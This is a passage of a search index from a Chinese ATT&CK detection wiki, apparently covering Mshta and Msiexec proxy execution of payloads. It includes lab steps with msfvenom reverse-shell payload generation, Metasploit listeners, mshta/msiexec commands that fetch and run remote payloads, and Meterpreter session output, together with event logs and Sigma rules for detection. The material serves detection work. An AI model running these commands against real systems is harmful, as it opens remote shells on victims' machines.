Mshta.exe\u53ef\u7ed5\u8fc7\u4e0d\u8003\u8651\u5176\u6f5c\u5728\u7528\u9014\u7684\u5e94\u7528\u767d\u540d\u5355\u89e3\u51b3\u65b9\u6848\u3002\u7531\u4e8emshta.exe\u5728InternetExplorer\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u4e4b\u5916\u6267\u884c\uff0c\u56e0\u6b64\u5b83\u8fd8\u4f1a\u7ed5\u8fc7\u6d4f\u89c8\u5668\u5b89\u5168\u8bbe\u7f6e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Mshta.exe\u662f\u5fae\u8f6fWindows\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\u7a0b\u5e8f\uff0c\u82f1\u6587\u5168\u79f0Microsoft HTML Application\uff0c\u53ef\u7ffb\u8bd1\u4e3a\u5fae\u8f6f\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u5e94\u7528\uff0c\u7528\u4e8e\u6267\u884c.HTA\u6587\u4ef6\u3002 \u8bf4\u660e\uff1aMshta\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0c\u53ef\u76f4\u63a5\u6267\u884cMshta.exe\u547d\u4ee4\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\mshta.exe C:\\Windows\\SysWOW64\\mshta.exe","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#payload","text":"root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f hta-psh -o test5.hta \u66ff\u6362\u76f8\u5173\u4fe1\u606f","title":"\u751f\u6210payload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_6","text":"use exploit/windows/misc/hta_server msf exploit(windows/misc/hta_server) > set lhost 192.168.126.146 msf exploit(windows/misc/hta_server) > set srvhost 192.168.126.146 msf exploit(windows/misc/hta_server) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#payload_1","text":"mshta.exe http://192.168.126.146:8080/Uj6Tcv.hta #\u9700\u8981\u5b89\u88c5.net Framework 3.5","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#shell","text":"msf5 exploit(windows/misc/hta_server) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Using URL: http://192.168.126.146:8080/Uj6Tcv.hta [*] Server started. msf5 exploit(windows/misc/hta_server) > [*] 192.168.126.156 hta_server - Delivering Payload [*] Sending stage (180291 bytes) to 192.168.126.156 [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.156:50232) at 2020-04-14 11:03:33 +0800","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_7","text":"\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0xb20 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\System32\\mshta.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c \u8fdb\u7a0b\u547d\u4ee4\u884c:mshta.exe http://192.168.126.146:8080/Uj6Tcv.hta","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790mshta.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u67e5\u627e\u5728\u547d\u4ee4\u884c\u4e2d\u6267\u884c\u539f\u59cb\u6216\u6df7\u6dc6\u811a\u672c\u7684mshta.exe\u3002\u6bd4\u8f83mshta.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728mshta.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#sigma","text":"title: MSHTA Suspicious Execution 01 id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3 status: experimental description: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism date: 2019/02/22 modified: 2019/02/22 author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule) references: - http://blog.sevagas.com/?Hacking-around-HTA-files - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356 - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997 tags: - attack.defense_evasion - attack.t1140 logsource: category: process_creation product: windows falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high detection: selection1: Image: '*\\mshta.exe' CommandLine: - '*vbscript*' - '*.jpg*' - '*.png*' - '*.lnk*' # - '*.chm*' # could be prone to false positives - '*.xls*' - '*.doc*' - '*.zip*' condition: selection1","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_9","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_10","text":"MITRE-ATT&CK-T1218-005 https://attack.mitre.org/techniques/T1218/005/ \u8fdc\u63a7\u514d\u6740\u4e13\u9898(37)-\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload http://sec.nmask.cn/article_content?a_id=d1a4d20858c9283aef9ef49d2e98352c \u68c0\u6d4b\u53ef\u7591\u7684Mshta\u4f7f\u7528\u60c5\u51b5 https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/detect-suspicious-mshta-usage.md","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/","text":"T1218-007-win-\u57fa\u4e8e\u767d\u540d\u5355Msiexec\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u53ef\u4fe1\u6570\u5b57\u8bc1\u4e66\u7b7e\u7f72\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u65f6\uff0c\u53ef\u901a\u8fc7\u6570\u5b57\u7b7e\u540d\u9a8c\u8bc1\u4fdd\u62a4\u3002Windows\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u5b89\u88c5\u7684\u4e00\u4e9b\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u6765\u4ee3\u7406\u6267\u884c\u5176\u5b83\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u6b64\u6280\u672f\u6765\u6267\u884c\u53ef\u80fd\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u673a\u5236\u548c\u7cfb\u7edf\u7b7e\u540d\u9a8c\u8bc1\u7684\u6076\u610f\u6587\u4ef6\u3002\u8be5\u6280\u672f\u8003\u8651\u4e86\u73b0\u6709\u6280\u672f\u4e2d\u5c1a\u672a\u8003\u8651\u7684\u4ee3\u7406\u6267\u884c\u65b9\u6cd5\u3002 \u6d4b\u8bd5\u6848\u4f8b Msiexec\u662fWindows Installer\u7684\u4e00\u90e8\u5206\u3002\u7528\u4e8e\u5b89\u88c5Windows Installer\u5b89\u88c5\u5305\uff08MSI\uff09,\u4e00\u822c\u5728\u8fd0\u884cMicrosoft Update\u5b89\u88c5\u66f4\u65b0\u6216\u5b89\u88c5\u90e8\u5206\u8f6f\u4ef6\u7684\u65f6\u5019\u51fa\u73b0\uff0c\u5360\u7528\u5185\u5b58\u6bd4\u8f83\u5927\u3002\u5e76\u4e14\u96c6\u6210\u4e8eWindows 2003\uff0cWindows 7\u7b49\u3002 \u8bf4\u660e\uff1aMsiexec.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMsiexec\u547d\u4ee4\u53ef\u8bc6\u522b\u3002Ftp.exe\u662fWindows\u672c\u8eab\u81ea\u5e26\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c5e\u4e8e\u5fae\u8f6fFTP\u5de5\u5177\uff0c\u63d0\u4f9b\u57fa\u672c\u7684FTP\u8bbf\u95ee\u3002 \u8bf4\u660e\uff1aFtp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cFtp.exe\u547d\u4ee4\u53ef\u8bc6\u522b\u3002 \u00b7 msiexec.exe /q /i\"C:\\path\\to\\file.msi\" \u00b7 msiexec.exe /q /i http[:]//site[.]com/file.msi \u00b7 msiexec.exe /y \"C:\\path\\to\\file.dll\" \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows 7 \u653b\u51fb\u5206\u6790 \u751f\u6210payload.dll msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f msi > 1.msi \u6267\u884c\u76d1\u542c msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 1234 lport => 1234 msf5 exploit(multi/handler) >expliot \u9776\u673a\u6267\u884cpayload msiexec /q /i http://192.168.126.146/1.msi \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:1234 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49323) at 2020-04-18 22:04:26 +0800 meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 \u6d4b\u8bd5\u7559\u75d5 # windows\u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xe78 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\msiexec.exe # sysmon\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a1 UtcTime: 2020-04-18 14:04:16.596 ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01} ProcessId: 3704 Image: C:\\Windows\\System32\\msiexec.exe FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows\u00ae installer Product: Windows Installer - Unicode Company: Microsoft Corporation OriginalFileName: msiexec.exe CommandLine: msiexec /q /i http://192.168.126.146/1.msi CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01} ParentProcessId: 1900 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: MsiExec Web Install status: experimental description: Detects suspicious msiexec process starts with web addreses as parameter references: - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/ tags: - attack.defense_evasion author: Florian Roth date: 2018/02/09 modified: 2012/12/11 logsource: category: process_creation product: windows detection: selection: CommandLine: - '* msiexec*://*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium \u5efa\u8bae \u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-007 https://attack.mitre.org/techniques/T1218/007/ \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"T1218-007-win-\u57fa\u4e8e\u767d\u540d\u5355Msiexec\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#t1218-007-win-msiexecpayload","text":"","title":"T1218-007-win-\u57fa\u4e8e\u767d\u540d\u5355Msiexec\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#attck","text":"\u53ef\u4fe1\u6570\u5b57\u8bc1\u4e66\u7b7e\u7f72\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u65f6\uff0c\u53ef\u901a\u8fc7\u6570\u5b57\u7b7e\u540d\u9a8c\u8bc1\u4fdd\u62a4\u3002Windows\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u5b89\u88c5\u7684\u4e00\u4e9b\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u6765\u4ee3\u7406\u6267\u884c\u5176\u5b83\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u6b64\u6280\u672f\u6765\u6267\u884c\u53ef\u80fd\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u673a\u5236\u548c\u7cfb\u7edf\u7b7e\u540d\u9a8c\u8bc1\u7684\u6076\u610f\u6587\u4ef6\u3002\u8be5\u6280\u672f\u8003\u8651\u4e86\u73b0\u6709\u6280\u672f\u4e2d\u5c1a\u672a\u8003\u8651\u7684\u4ee3\u7406\u6267\u884c\u65b9\u6cd5\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_1","text":"Msiexec\u662fWindows Installer\u7684\u4e00\u90e8\u5206\u3002\u7528\u4e8e\u5b89\u88c5Windows Installer\u5b89\u88c5\u5305\uff08MSI\uff09,\u4e00\u822c\u5728\u8fd0\u884cMicrosoft Update\u5b89\u88c5\u66f4\u65b0\u6216\u5b89\u88c5\u90e8\u5206\u8f6f\u4ef6\u7684\u65f6\u5019\u51fa\u73b0\uff0c\u5360\u7528\u5185\u5b58\u6bd4\u8f83\u5927\u3002\u5e76\u4e14\u96c6\u6210\u4e8eWindows 2003\uff0cWindows 7\u7b49\u3002 \u8bf4\u660e\uff1aMsiexec.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMsiexec\u547d\u4ee4\u53ef\u8bc6\u522b\u3002Ftp.exe\u662fWindows\u672c\u8eab\u81ea\u5e26\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c5e\u4e8e\u5fae\u8f6fFTP\u5de5\u5177\uff0c\u63d0\u4f9b\u57fa\u672c\u7684FTP\u8bbf\u95ee\u3002 \u8bf4\u660e\uff1aFtp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cFtp.exe\u547d\u4ee4\u53ef\u8bc6\u522b\u3002 \u00b7 msiexec.exe /q /i\"C:\\path\\to\\file.msi\" \u00b7 msiexec.exe /q /i http[:]//site[.]com/file.msi \u00b7 msiexec.exe /y \"C:\\path\\to\\file.dll\" \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows 7","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#payloaddll","text":"msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f msi > 1.msi","title":"\u751f\u6210payload.dll"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_6","text":"msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 1234 lport => 1234 msf5 exploit(multi/handler) >expliot","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#payload","text":"msiexec /q /i http://192.168.126.146/1.msi","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:1234 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49323) at 2020-04-18 22:04:26 +0800 meterpreter > getuid Server username: 12306Br0-PC\\12306Br0","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_7","text":"# windows\u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xe78 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\msiexec.exe # sysmon\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a1 UtcTime: 2020-04-18 14:04:16.596 ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01} ProcessId: 3704 Image: C:\\Windows\\System32\\msiexec.exe FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows\u00ae installer Product: Windows Installer - Unicode Company: Microsoft Corporation OriginalFileName: msiexec.exe CommandLine: msiexec /q /i http://192.168.126.146/1.msi CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01} ParentProcessId: 1900 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#sigma","text":"title: MsiExec Web Install status: experimental description: Detects suspicious msiexec process starts with web addreses as parameter references: - 